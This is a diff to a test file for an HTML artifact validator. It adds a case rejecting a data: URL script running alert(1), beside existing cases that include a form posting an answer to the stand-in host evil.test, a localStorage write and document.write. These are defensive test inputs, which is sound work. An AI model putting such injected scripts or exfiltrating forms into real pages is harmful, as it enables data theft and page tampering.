@@ -87,6 +87,7 @@ describe("activity artifact contracts", () => {
     ["dot-relative subresource", "<script src='./main.js'></script>", "external or executable URL references are forbidden"],
     ["relative poster", "<video poster='asset.png'></video>", "external or executable URL references are forbidden"],
     ["relative srcset candidate", "<img srcset='asset.png 1x'>", "external or executable URL references are forbidden"],
+    ["data script URL", "<script src='data:text/javascript,alert(1)'></script>", "external or executable URL references are forbidden"],
     ["form submission", "<form action='https://evil.test/collect'><input name='answer'></form>", "forms are forbidden"],
     ["storage access", "<script>localStorage.setItem('answer', 'secret')</script>", "localStorage is forbidden"],
     ["layout replacement", "<script>document.write('<main>replacement</main>')</script>", "document.write is forbidden"],
